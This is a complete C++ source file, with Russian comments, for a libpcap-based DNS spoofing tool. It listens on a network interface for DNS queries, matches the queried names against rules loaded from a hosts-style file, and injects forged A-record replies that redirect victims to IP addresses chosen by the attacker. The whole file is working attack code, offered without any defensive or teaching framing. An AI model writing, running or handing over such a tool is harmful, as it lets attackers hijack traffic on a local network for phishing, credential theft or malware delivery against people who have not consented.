// g++ -O2 -pthread dnsspoof.cpp -o dnsspoof -lpcap -std=c++11
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <atomic>
#include <vector>
#include <string>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <net/ethernet.h> // для ETHERTYPE_IP

std::atomic<bool> stop_flag(false);
pcap_t* global_handle = nullptr;

void signal_handler(int sig) {
    stop_flag = true;
    if (global_handle) {
        pcap_breakloop(global_handle);
    }
}

// ========== Свои структуры (без конфликтов) ==========
#pragma pack(push, 1)
struct my_ether_header {
    uint8_t  dst_mac[6];
    uint8_t  src_mac[6];
    uint16_t ether_type;
};

struct my_ip_header {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct my_udp_header {
    uint16_t source;
    uint16_t dest;
    uint16_t len;
    uint16_t check;
};

struct my_dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};
#pragma pack(pop)

// ========== Правила подмены ==========
struct DnsRule {
    std::string domain;
    std::string ip;
    bool is_wildcard;
};

std::vector<DnsRule> rules;

bool load_rules(const std::string& filename) {
    std::ifstream file(filename);
    if (!file.is_open()) {
        fprintf(stderr, "Cannot open hosts file: %s\n", filename.c_str());
        return false;
    }
    std::string line;
    while (std::getline(file, line)) {
        if (line.empty() || line[0] == '#') continue;
        std::istringstream iss(line);
        std::string ip, domain;
        if (!(iss >> ip >> domain)) continue;
        DnsRule rule;
        rule.ip = ip;
        rule.domain = domain;
        rule.is_wildcard = (domain.find('*') != std::string::npos);
        rules.push_back(rule);
        printf("Loaded rule: %s -> %s\n", domain.c_str(), ip.c_str());
    }
    return true;
}

bool match_domain(const std::string& qname, const DnsRule& rule) {
    if (rule.is_wildcard) {
        std::string pattern = rule.domain;
        pattern.erase(std::remove(pattern.begin(), pattern.end(), '*'), pattern.end());
        if (pattern.empty()) return true;
        if (qname.length() >= pattern.length() &&
            qname.compare(qname.length() - pattern.length(), pattern.length(), pattern) == 0) {
            return true;
        }
        return false;
    } else {
        return qname == rule.domain;
    }
}

// ========== Функция для подсчёта checksum ==========
uint16_t in_cksum(uint16_t *ptr, int nbytes) {
    uint32_t sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) sum += *(uint8_t*)ptr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

// ========== Отправка поддельного DNS-ответа ==========
void send_dns_reply(pcap_t* handle, const uint8_t* packet,
                    const struct ip* ip, const struct udphdr* udp,
                    const char* qname, const std::string& spoof_ip) {
    struct my_ether_header* eth_orig = (struct my_ether_header*)packet;
    struct my_ether_header eth_resp;
    memcpy(eth_resp.dst_mac, eth_orig->src_mac, 6);
    memcpy(eth_resp.src_mac, eth_orig->dst_mac, 6);
    eth_resp.ether_type = htons(ETHERTYPE_IP);

    struct my_ip_header ip_resp;
    ip_resp.version = 4;
    ip_resp.ihl = 5;
    ip_resp.tos = 0;
    ip_resp.tot_len = htons(sizeof(ip_resp) + sizeof(struct udphdr) + 12 + strlen(qname) + 16);
    ip_resp.id = 0;
    ip_resp.frag_off = 0;
    ip_resp.ttl = 64;
    ip_resp.protocol = IPPROTO_UDP;
    ip_resp.check = 0;
    ip_resp.saddr = ip->ip_dst.s_addr;
    ip_resp.daddr = ip->ip_src.s_addr;

    struct my_udp_header udp_resp;
    udp_resp.source = udp->uh_dport;
    udp_resp.dest = udp->uh_sport;
    udp_resp.len = htons(sizeof(udp_resp) + sizeof(struct my_dns_header) + 12 + strlen(qname) + 16);
    udp_resp.check = 0;

    struct my_dns_header* dns_orig = (struct my_dns_header*)((uint8_t*)udp + sizeof(struct udphdr));
    struct my_dns_header dns_resp;
    dns_resp.id = dns_orig->id;
    dns_resp.flags = htons(0x8180);
    dns_resp.qdcount = dns_orig->qdcount;
    dns_resp.ancount = htons(1);
    dns_resp.nscount = 0;
    dns_resp.arcount = 0;

    std::vector<uint8_t> buffer(1024);
    uint8_t* ptr = buffer.data();

    memcpy(ptr, &eth_resp, sizeof(eth_resp)); ptr += sizeof(eth_resp);
    memcpy(ptr, &ip_resp, sizeof(ip_resp)); ptr += sizeof(ip_resp);
    memcpy(ptr, &udp_resp, sizeof(udp_resp)); ptr += sizeof(udp_resp);
    memcpy(ptr, &dns_resp, sizeof(dns_resp)); ptr += sizeof(dns_resp);

    // Копируем вопрос (QD)
    uint8_t* orig_qd = (uint8_t*)dns_orig + sizeof(struct my_dns_header);
    uint8_t* qd_end = orig_qd;
    while (1) {
        if (*qd_end == 0) { qd_end++; break; }
        if ((*qd_end & 0xC0) == 0xC0) { qd_end += 2; break; }
        qd_end += *qd_end + 1;
    }
    int qd_len = qd_end - orig_qd + 4;
    memcpy(ptr, orig_qd, qd_len); ptr += qd_len;

    // Ответ (AN)
    *ptr++ = 0xC0; *ptr++ = 0x0C; // указатель на имя
    *((uint16_t*)ptr) = htons(1); ptr += 2; // type A
    *((uint16_t*)ptr) = htons(1); ptr += 2; // class IN
    *((uint32_t*)ptr) = htonl(1); ptr += 4; // TTL=1
    *((uint16_t*)ptr) = htons(4); ptr += 2; // data length
    struct in_addr addr;
    inet_pton(AF_INET, spoof_ip.c_str(), &addr);
    memcpy(ptr, &addr, 4); ptr += 4;

    size_t total_len = ptr - buffer.data();

    struct my_ip_header* ip_out = (struct my_ip_header*)(buffer.data() + sizeof(struct my_ether_header));
    ip_out->check = 0;
    ip_out->check = in_cksum((uint16_t*)ip_out, sizeof(struct my_ip_header));

    if (pcap_sendpacket(handle, buffer.data(), total_len) != 0) {
        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
    } else {
        printf("Spoofed: %s -> %s\n", qname, spoof_ip.c_str());
        fflush(stdout);
    }
}

// ========== Обработчик пакетов ==========
void packet_handler(u_char* user, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct my_ether_header* eth = (struct my_ether_header*)packet;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;

    struct ip* ip = (struct ip*)(packet + sizeof(struct my_ether_header));
    if (ip->ip_p != IPPROTO_UDP) return;

    struct udphdr* udp = (struct udphdr*)((uint8_t*)ip + (ip->ip_hl << 2));
    if (ntohs(udp->uh_dport) != 53 && ntohs(udp->uh_sport) != 53) return;

    struct my_dns_header* dns = (struct my_dns_header*)((uint8_t*)udp + sizeof(struct udphdr));
    if ((ntohs(dns->flags) & 0x8000) != 0) return;

    // Извлекаем имя домена
    uint8_t* qname_start = (uint8_t*)dns + sizeof(struct my_dns_header);
    std::string qname;
    uint8_t* ptr = qname_start;
    while (*ptr != 0) {
        int len = *ptr++;
        for (int i = 0; i < len; i++) {
            qname += tolower(*ptr++);
        }
        if (*ptr != 0) qname += '.';
    }

    for (auto& rule : rules) {
        if (match_domain(qname, rule)) {
            send_dns_reply((pcap_t*)user, packet, ip, udp, qname.c_str(), rule.ip);
            break;
        }
    }
}

// ========== main ==========
int main(int argc, char* argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s -i <interface> -f <hosts_file>\n", argv[0]);
        return 1;
    }

    char* iface = nullptr;
    char* hosts_file = nullptr;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-i") == 0 && i+1 < argc) {
            iface = argv[++i];
        } else if (strcmp(argv[i], "-f") == 0 && i+1 < argc) {
            hosts_file = argv[++i];
        }
    }

    if (!iface || !hosts_file) {
        fprintf(stderr, "Missing -i or -f\n");
        return 1;
    }

    if (!load_rules(hosts_file)) return 1;

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface, 65536, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Interface doesn't support Ethernet\n");
        pcap_close(handle);
        return 1;
    }
    global_handle = handle;

    struct bpf_program fp;
    if (pcap_compile(handle, &fp, "udp port 53", 0, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "pcap_compile: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return 1;
    }
    if (pcap_setfilter(handle, &fp) == -1) {
        fprintf(stderr, "pcap_setfilter: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return 1;
    }
    pcap_freecode(&fp);

    printf("DNS Spoofing started on %s, using rules from %s\n", iface, hosts_file);
    printf("Press Ctrl+C to stop\n");
    fflush(stdout);

    pcap_loop(handle, -1, packet_handler, (u_char*)handle);

    pcap_close(handle);
    printf("DNS Spoofing stopped.\n");
    return 0;
}